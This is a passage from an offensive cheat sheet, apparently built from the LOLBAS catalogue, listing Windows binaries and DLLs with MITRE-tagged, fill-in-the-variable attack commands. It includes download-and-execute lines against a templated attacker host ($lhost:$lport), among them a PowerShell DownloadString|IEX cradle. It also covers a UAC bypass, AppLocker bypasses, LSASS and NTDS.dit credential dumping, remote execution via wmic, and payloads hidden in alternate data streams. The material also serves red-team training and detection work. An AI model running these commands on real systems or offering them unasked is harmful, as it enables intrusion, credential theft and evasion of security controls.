ssh localhost "$cmd"
```
<!-- cheat
var cmd
-->

### ssh.exe Execute #2

Executes specified command from ssh.exe

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes specified command from ssh.exe"
ssh -o ProxyCommand="$cmd" .
```
<!-- cheat
var cmd
-->

## Stordiag.exe

Storage diagnostic tool

**Path(s):**
- `c:\windows\system32\stordiag.exe`
- `c:\windows\syswow64\stordiag.exe`

### Stordiag.exe Execute #1

Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Stordiag.exe Execute #1"
stordiag.exe
```
<!-- cheat
-->

### Stordiag.exe Execute #2

Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Stordiag.exe Execute #2"
stordiag.exe
```
<!-- cheat
-->

## SyncAppvPublishingServer.exe

Used by App-v to get App-v server lists

**Path(s):**
- `C:\Windows\System32\SyncAppvPublishingServer.exe`
- `C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`

### SyncAppvPublishingServer.exe Execute

Example command on how inject Powershell code into the process

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Example command on how inject Powershell code into the process"
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/$file') | IEX"
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Tar.exe

Used by Windows to extract and create archives.

**Path(s):**
- `C:\Windows\System32\tar.exe`
- `C:\Windows\SysWOW64\tar.exe`

### Tar.exe ADS #1

Compress one or more files to an alternate data stream (ADS).

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Compress one or more files to an alternate data stream (ADS)"
tar -cf $file_out:ads $dir
```
<!-- cheat
var dir
var file_out
-->

### Tar.exe ADS #2

Decompress a compressed file from an alternate data stream (ADS).

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Decompress a compressed file from an alternate data stream (ADS)"
tar -xf $file_out:ads
```
<!-- cheat
var file_out
-->

### Tar.exe Copy #3

Extracts archive.tar from the remote (internal) host to the current host.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Extracts archive.tar from the remote (internal) host to the current host"
tar -xf \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

## Ttdinject.exe

Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)

**Path(s):**
- `C:\Windows\System32\ttdinject.exe`
- `C:\Windows\Syswow64\ttdinject.exe`

### Ttdinject.exe Execute #1

Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.

*Privileges: Administrator • MITRE: T1127*

```cmd title:"Lolbas Execute a program using ttdinject.exe"
TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "$file_out"
```
<!-- cheat
var file_out
-->

### Ttdinject.exe Execute #2

Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.

*Privileges: Administrator • MITRE: T1127*

```cmd title:"Lolbas Execute a program using ttdinject.exe"
ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "$file_out"
```
<!-- cheat
var file_out
-->

## Tttracer.exe

Used by Windows 1809 and newer to Debug Time Travel

**Path(s):**
- `C:\Windows\System32\tttracer.exe`
- `C:\Windows\SysWOW64\tttracer.exe`

### Tttracer.exe Execute #1

Execute specified executable from tttracer.exe. Requires administrator privileges.

*Privileges: Administrator • MITRE: T1127*

```cmd title:"Lolbas Execute specified executable from tttracer.exe. Requires administrator privileges"
tttracer.exe $file_out
```
<!-- cheat
var file_out
-->

### Tttracer.exe Dump #2

Dumps process using tttracer.exe. Requires administrator privileges

*Privileges: Administrator • MITRE: T1003*

```cmd title:"Lolbas Dumps process using tttracer.exe. Requires administrator privileges"
TTTracer.exe -dumpFull -attach $pid
```
<!-- cheat
var pid
-->

## Unregmp2.exe

Microsoft Windows Media Player Setup Utility

**Path(s):**
- `C:\Windows\System32\unregmp2.exe`
- `C:\Windows\SysWOW64\unregmp2.exe`

### Unregmp2.exe Execute

Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Unregmp2.exe Execute"
rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
```
<!-- cheat
-->

## vbc.exe

Binary file used for compile vbs code

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe`
- `C:\Windows\Microsoft.NET\Framework\v3.5\vbc.exe`
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v3.5\vbc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\vbc.exe`

### vbc.exe Compile #1

Binary file used by .NET to compile Visual Basic code to an executable.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Binary file used by .NET to compile Visual Basic code to an executable"
vbc.exe /target:exe $file_out
```
<!-- cheat
var file_out
-->

### vbc.exe Compile #2

Binary file used by .NET to compile Visual Basic code to an executable.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Binary file used by .NET to compile Visual Basic code to an executable"
vbc -reference:Microsoft.VisualBasic.dll $file_out
```
<!-- cheat
var file_out
-->

## Verclsid.exe

Used to verify a COM object before it is instantiated by Windows Explorer

**Path(s):**
- `C:\Windows\System32\verclsid.exe`
- `C:\Windows\SysWOW64\verclsid.exe`

### Verclsid.exe Execute

Used to verify a COM object before it is instantiated by Windows Explorer

*Privileges: User • MITRE: T1218.012*

```cmd title:"Lolbas Used to verify a COM object before it is instantiated by Windows Explorer"
verclsid.exe /S /C $clsid
```
<!-- cheat
var clsid
-->

## Wab.exe

Windows address book manager

**Path(s):**
- `C:\Program Files\Windows Mail\wab.exe`
- `C:\Program Files (x86)\Windows Mail\wab.exe`

### Wab.exe Execute

Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice

*Privileges: Administrator • MITRE: T1218*

```cmd title:"Lolbas Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice"
wab.exe
```
<!-- cheat
-->

## wbadmin.exe

Windows Backup Administration utility

**Path(s):**
- `C:\Windows\System32\wbadmin.exe`

### wbadmin.exe Dump #1

Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)

*Privileges: Administrator, Backup Operators, SeBackupPrivilege • MITRE: T1003.003*

```cmd title:"Lolbas Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)"
wbadmin start backup -backupTarget:$dir -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
```
<!-- cheat
var dir
-->

### wbadmin.exe Dump #2

Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.

*Privileges: Administrator, Backup Operators, SeBackupPrivilege • MITRE: T1003.003*

```cmd title:"Lolbas Restore a version of NTDS.dit and SYSTEM hive into file path"
wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:$dir -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
```
<!-- cheat
var dir
var VERSIONIDENTIFIER := <VERSIONIDENTIFIER>
-->

## wbemtest.exe

WMI/WBEM Test Binary

**Path(s):**
- `c:\windows\system32\wbem\wbemtest.exe`

### wbemtest.exe Execute

Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources.

*Privileges: Any • MITRE: T1047*

```cmd title:"Lolbas wbemtest.exe Execute"
wbemtest.exe
```
<!-- cheat
-->

## winget.exe

Windows Package Manager tool

**Path(s):**
- `C:\Users\user\AppData\Local\Microsoft\WindowsApps\winget.exe`

### winget.exe Execute #1

Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`

*Privileges: Local Administrator - required to enable local manifest setting • MITRE: T1105*

```cmd title:"Lolbas Downloads a file from the web address specified in .yml file and executes it on the system"
winget.exe install --manifest $file_out
```
<!-- cheat
var file_out
-->

### winget.exe Download #2

Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas winget.exe Download #2"
winget.exe install --accept-package-agreements -s msstore $name_or_id
```
<!-- cheat
var name_or_id
-->

### winget.exe AWL Bypass #3

Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas winget.exe AWL Bypass #3"
winget.exe install --accept-package-agreements -s msstore $name_or_id
```
<!-- cheat
var name_or_id
-->

## Wlrmdr.exe

Windows Logon Reminder executable

**Path(s):**
- `c:\windows\system32\wlrmdr.exe`

### Wlrmdr.exe Execute

Execute executable with wlrmdr.exe as parent process

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute executable with wlrmdr.exe as parent process"
wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u $file_out
```
<!-- cheat
var file_out
-->

## Wmic.exe

The WMI command-line (WMIC) utility provides a command-line interface for WMI

**Path(s):**
- `C:\Windows\System32\wbem\wmic.exe`
- `C:\Windows\SysWOW64\wbem\wmic.exe`

### Wmic.exe ADS #1

Execute a .EXE file stored as an Alternate Data Stream (ADS)

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Execute a .EXE file stored as an Alternate Data Stream (ADS)"
wmic.exe process call create "$file_out:program.exe"
```
<!-- cheat
var file_out
-->

### Wmic.exe Execute #2

Execute calc from wmic

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute calc from wmic"
wmic.exe process call create "$cmd"
```
<!-- cheat
var cmd
-->

### Wmic.exe Execute #3

Execute evil.exe on the remote system.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute evil.exe on the remote system"
wmic.exe /node:"$lhost" process call create "$cmd"
```
<!-- cheat
import tun_ip
var cmd
-->

### Wmic.exe Execute #4

Create a volume shadow copy of NTDS.dit that can be copied.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Create a volume shadow copy of NTDS.dit that can be copied"
wmic.exe process get brief /format:"$scheme://$lhost:$lport/$file"
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Wmic.exe Execute #5

Executes JScript or VBScript embedded in the target remote XSL stylsheet.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes JScript or VBScript embedded in the target remote XSL stylsheet"
wmic.exe process get brief /format:"\\$lhost\$share\$file"
```
<!-- cheat
import tun_ip
var file
var share
-->

### Wmic.exe Copy #6

Copy file from source to destination.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copy file from source to destination"
wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
```
<!-- cheat
-->

## WorkFolders.exe

Work Folders

**Path(s):**
- `C:\Windows\System32\WorkFolders.exe`

### WorkFolders.exe Execute #1

Execute `control.exe` in the current working directory

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute control.exe in the current working directory"
WorkFolders
```
<!-- cheat
-->

### WorkFolders.exe Execute #2

`WorkFolders` attempts to execute `control.exe`. By modifying the default value of the App Paths registry key for `control.exe` in `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\control.exe`, an attacker can achieve proxy execution.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas WorkFolders attempts to execute control.exe"
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "$file_in" /f
WorkFolders
```
<!-- cheat
var file_in
-->

## write.exe

Windows Write

**Path(s):**
- `C:\Windows\write.exe`
- `C:\Windows\System32\write.exe`
- `C:\Windows\SysWOW64\write.exe`

### write.exe Execute

Executes a binary provided in default value of `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\wordpad.exe`.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas write.exe Execute"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\wordpad.exe" /ve /d "$file_in" /f
write.exe
```
<!-- cheat
var file_in
-->

## Wscript.exe

Used by Windows to execute scripts

**Path(s):**
- `C:\Windows\System32\wscript.exe`
- `C:\Windows\SysWOW64\wscript.exe`

### Wscript.exe ADS #1

Execute script stored in an alternate data stream

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Execute script stored in an alternate data stream"
wscript //e:vbscript $file_out:script.vbs
```
<!-- cheat
var file_out
-->

### Wscript.exe ADS #2

Download and execute script stored in an alternate data stream

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Download and execute script stored in an alternate data stream"
echo GetObject("script:$scheme://$lhost:$lport/$file") > $file_out:hi.js && wscript.exe $file_out:hi.js
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

## Wsreset.exe

Used to reset Windows Store settings according to its manifest file

**Path(s):**
- `C:\Windows\System32\wsreset.exe`

### Wsreset.exe UAC Bypass

During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.

*Privileges: User • MITRE: T1548.002*

```cmd title:"Lolbas Wsreset.exe UAC Bypass"
wsreset.exe
```
<!-- cheat
-->

## wt.exe

Windows Terminal

**Path(s):**
- `C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_<version_packageid>\wt.exe`

### wt.exe Execute

Execute a command via Windows Terminal.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute a command via Windows Terminal"
wt.exe $cmd
```
<!-- cheat
var cmd
-->

## wuauclt.exe

Windows Update Client

**Path(s):**
- `C:\Windows\System32\wuauclt.exe`
- `C:\Windows\UUS\amd64\wuauclt.exe`

### wuauclt.exe Execute

Loads and executes DLL code on attach.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Loads and executes DLL code on attach"
wuauclt.exe /UpdateDeploymentProvider $file_out /RunHandlerComServer
```
<!-- cheat
var file_out
-->

## Xwizard.exe

Execute custom class that has been added to the registry or download a file with Xwizard.exe

**Path(s):**
- `C:\Windows\System32\xwizard.exe`
- `C:\Windows\SysWOW64\xwizard.exe`

### Xwizard.exe Execute #1

Xwizard.exe running a custom class that has been added to the registry.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Xwizard.exe running a custom class that has been added to the registry"
xwizard RunWizard $00000001_0000_0000_0000_0000feedacdc
```
<!-- cheat
var 00000001_0000_0000_0000_0000feedacdc
-->

### Xwizard.exe Execute #2

Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Xwizard.exe running a custom class that has been added to the registry"
xwizard RunWizard /taero /u $00000001_0000_0000_0000_0000feedacdc
```
<!-- cheat
var 00000001_0000_0000_0000_0000feedacdc
-->

### Xwizard.exe Download #3

Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Xwizard.exe Download #3"
xwizard RunWizard $7940acf8_60ba_4213_a7c3_f3b400ee266d /z$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var 7940acf8_60ba_4213_a7c3_f3b400ee266d
var file
-->

# OS Libraries

## Advpack.dll

Utility for installing software and drivers with rundll32.exe

**Path(s):**
- `c:\windows\system32\advpack.dll`
- `c:\windows\syswow64\advpack.dll`

### Advpack.dll AWL Bypass #1

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Advpack.dll AWL Bypass #1"
rundll32.exe advpack.dll,LaunchINFSection $file_out,DefaultInstall_SingleUser,1,
```
<!-- cheat
var file_out
-->

### Advpack.dll AWL Bypass #2

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Advpack.dll AWL Bypass #2"
rundll32.exe advpack.dll,LaunchINFSection $file_out,,1,
```
<!-- cheat
var file_out
-->

### Advpack.dll Execute #3

Launch a DLL payload by calling the RegisterOCX function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch a DLL payload by calling the RegisterOCX function"
rundll32.exe advpack.dll,RegisterOCX $file_out
```
<!-- cheat
var file_out
-->

### Advpack.dll Execute #4

Launch an executable by calling the RegisterOCX function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable by calling the RegisterOCX function"
rundll32.exe advpack.dll,RegisterOCX $file_out
```
<!-- cheat
var file_out
-->

### Advpack.dll Execute #5

Launch command line by calling the RegisterOCX function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch command line by calling the RegisterOCX function"
rundll32 advpack.dll, RegisterOCX $cmd
```
<!-- cheat
var cmd
-->

## Comsvcs.dll

COM+ Services

**Path(s):**
- `c:\windows\system32\comsvcs.dll`

### Comsvcs.dll Dump

Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.

*Privileges: SYSTEM • MITRE: T1003.001*

```cmd title:"Lolbas Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump"
rundll32 C:\windows\system32\comsvcs.dll MiniDump $lsass_pid dump.bin full
```
<!-- cheat
var lsass_pid
-->

## Desk.cpl

Desktop Settings Control Panel

**Path(s):**
- `C:\Windows\System32\desk.cpl`
- `C:\Windows\SysWOW64\desk.cpl`

### Desk.cpl Execute #1

Launch an executable with a .scr extension by calling the InstallScreenSaver function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable with a .scr extension by calling the InstallScreenSaver function"
rundll32.exe desk.cpl,InstallScreenSaver $file_out
```
<!-- cheat
var file_out
-->

### Desk.cpl Execute #2

Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Desk.cpl Execute #2"
rundll32.exe desk.cpl,InstallScreenSaver \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

## Dfshim.dll

ClickOnce engine in Windows used by .NET

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe`

### Dfshim.dll AWL Bypass

Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)

*Privileges: User • MITRE: T1127.002*

```cmd title:"Lolbas Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)"
rundll32.exe dfshim.dll,ShOpenVerbApplication $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Ieadvpack.dll

INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.

**Path(s):**
- `c:\windows\system32\ieadvpack.dll`
- `c:\windows\syswow64\ieadvpack.dll`

### Ieadvpack.dll AWL Bypass #1

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Ieadvpack.dll AWL Bypass #1"
rundll32.exe ieadvpack.dll,LaunchINFSection $file_out,DefaultInstall_SingleUser,1,
```
<!-- cheat
var file_out
-->

### Ieadvpack.dll AWL Bypass #2

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Ieadvpack.dll AWL Bypass #2"
rundll32.exe ieadvpack.dll,LaunchINFSection $file_out,,1,
```
<!-- cheat
var file_out
-->

### Ieadvpack.dll Execute #3

Launch a DLL payload by calling the RegisterOCX function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch a DLL payload by calling the RegisterOCX function"
rundll32.exe ieadvpack.dll,RegisterOCX $file_out
```
<!-- cheat
var file_out
-->

### Ieadvpack.dll Execute #4

Launch an executable by calling the RegisterOCX function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable by calling the RegisterOCX function"
rundll32.exe ieadvpack.dll,RegisterOCX $file_out
```
<!-- cheat
var file_out
-->

### Ieadvpack.dll Execute #5

Launch command line by calling the RegisterOCX function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch command line by calling the RegisterOCX function"
rundll32 ieadvpack.dll, RegisterOCX $cmd
```
<!-- cheat
var cmd
-->

## Ieframe.dll

Internet Browser DLL for translating HTML code.

**Path(s):**
- `c:\windows\system32\ieframe.dll`
- `c:\windows\syswow64\ieframe.dll`

### Ieframe.dll Execute

Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL"
rundll32.exe ieframe.dll,OpenURL $file_out
```
<!-- cheat
var file_out
-->

## Mshtml.dll

Microsoft HTML Viewer

**Path(s):**
- `c:\windows\system32\mshtml.dll`
- `c:\windows\syswow64\mshtml.dll`

### Mshtml.dll Execute

Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box)"
rundll32.exe Mshtml.dll,PrintHTML $file_out
```
<!-- cheat
var file_out
-->

## Pcwutl.dll

Microsoft HTML Viewer

**Path(s):**
- `c:\windows\system32\pcwutl.dll`
- `c:\windows\syswow64\pcwutl.dll`

### Pcwutl.dll Execute

Launch executable by calling the LaunchApplication function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch executable by calling the LaunchApplication function"
rundll32.exe pcwutl.dll,LaunchApplication $file_out
```
<!-- cheat
var file_out
-->

## PhotoViewer.dll

Windows Photo Viewer

**Path(s):**
- `C:\Program Files\Windows Photo Viewer\PhotoViewer.dll`
- `C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll`

### PhotoViewer.dll Download

Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas PhotoViewer.dll Download"
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Scrobj.dll

Windows Script Component Runtime

**Path(s):**
- `c:\windows\system32\scrobj.dll`
- `c:\windows\syswow64\scrobj.dll`

### Scrobj.dll Download

Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache"
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Setupapi.dll

Windows Setup Application Programming Interface

**Path(s):**
- `c:\windows\system32\setupapi.dll`
- `c:\windows\syswow64\setupapi.dll`

### Setupapi.dll AWL Bypass #1

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Setupapi.dll AWL Bypass #1"
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 $file_out
```
<!-- cheat
var file_out
-->

### Setupapi.dll Execute #2

Launch an executable file via the InstallHinfSection function and .inf file section directive.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable file via the InstallHinfSection function and .inf file section directive"
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 $file_out
```
<!-- cheat
var file_out
-->

## Shdocvw.dll

Shell Doc Object and Control Library.

**Path(s):**
- `c:\windows\system32\shdocvw.dll`
- `c:\windows\syswow64\shdocvw.dll`

### Shdocvw.dll Execute

Launch an executable payload via proxy through a URL (information) file by calling OpenURL.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable payload via proxy through a URL (information) file by calling OpenURL"
rundll32.exe shdocvw.dll,OpenURL $file_out
```
<!-- cheat
var file_out
-->

## Shell32.dll

Windows Shell Common Dll

**Path(s):**
- `c:\windows\system32\shell32.dll`
- `c:\windows\syswow64\shell32.dll`

### Shell32.dll Execute #1

Launch a DLL payload by calling the Control_RunDLL function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch a DLL payload by calling the Control_RunDLL function"
rundll32.exe shell32.dll,Control_RunDLL $file_out
```
<!-- cheat
var file_out
-->

### Shell32.dll Execute #2

Launch an executable by calling the ShellExec_RunDLL function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable by calling the ShellExec_RunDLL function"
rundll32.exe shell32.dll,ShellExec_RunDLL $file_out
```
<!-- cheat
var file_out
-->

### Shell32.dll Execute #3

Launch command line by calling the ShellExec_RunDLL function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch command line by calling the ShellExec_RunDLL function"
rundll32 SHELL32.DLL,ShellExec_RunDLL $file_out $cmd
```
<!-- cheat
var cmd
var file_out
-->

### Shell32.dll Execute #4

Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function"
rundll32.exe shell32.dll,#44 $file_out
```
<!-- cheat
var file_out
-->

## Shimgvw.dll

Photo Gallery Viewer

**Path(s):**
- `c:\windows\system32\shimgvw.dll`
- `c:\windows\syswow64\shimgvw.dll`

### Shimgvw.dll Download

Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Once executed, rundll32.exe will download the file at the URL in the command to INetCache"
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Syssetup.dll

Windows NT System Setup

**Path(s):**
- `c:\windows\system32\syssetup.dll`
- `c:\windows\syswow64\syssetup.dll`

### Syssetup.dll AWL Bypass #1

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Syssetup.dll AWL Bypass #1"
rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 $file_out
```
<!-- cheat
var file_out
-->

### Syssetup.dll Execute #2

Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Syssetup.dll Execute #2"
rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 $file_out
```
<!-- cheat
var file_out
-->

## Url.dll

Internet Shortcut Shell Extension DLL.

**Path(s):**
- `c:\windows\system32\url.dll`
- `c:\windows\syswow64\url.dll`

### Url.dll Execute #1

Launch a HTML application payload by calling OpenURL.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch a HTML application payload by calling OpenURL"
rundll32.exe url.dll,OpenURL $file_out
```
<!-- cheat
var file_out
-->

### Url.dll Execute #2

Launch an executable payload via proxy through a .url (information) file by calling OpenURL.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable payload via proxy through a .url (information) file by calling OpenURL"
rundll32.exe url.dll,OpenURL $file_out
```
<!-- cheat
var file_out
-->

### Url.dll Execute #3

Launch an executable by calling OpenURL.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable by calling OpenURL"
rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
```
<!-- cheat
-->

### Url.dll Execute #4

Launch an executable by calling FileProtocolHandler.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Launch an executable by calling FileProtocolHandler"
